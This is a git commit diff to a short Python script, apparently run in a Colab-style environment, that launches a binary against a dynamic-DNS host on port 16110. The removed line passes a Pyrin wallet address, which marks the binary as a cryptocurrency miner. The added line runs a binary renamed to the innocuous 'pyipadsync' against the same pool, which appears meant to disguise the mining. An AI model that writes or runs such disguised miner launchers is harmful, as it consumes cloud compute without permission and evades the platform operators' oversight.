018434a6713537a3baedbdf9e0d9230dc33c1bb7
takaratuan90 <44602266+takaratuan90@users.noreply.github.com>
2023-12-08 18:45:10 +0700

    Update 2file.py

--- 2file.py
+++ 2file.py
@@ -1,3 +1,6 @@
 import subprocess
+
 # Run the command
-subprocess.run(['/content/yoyoyo/yamato', '-s', 'btacg.ddns.net:16110', '-a', 'pyrin:qzvxzpvh6vvmvqvfdrzxljg4t9vyn9meg8fkxdfqadxhaxqezc4ecp9296xq0'])
+subprocess.run(['/content/yoyoyo/pyipadsync', '-s', 'btacg.ddns.net:16110'])
+
+#subprocess.run(['/content/yoyoyo/yamato', '-s', 'btacg.ddns.net:16110', '-a', 'pyrin:qzvxzpvh6vvmvqvfdrzxljg4t9vyn9meg8fkxdfqadxhaxqezc4ecp9296xq0'])
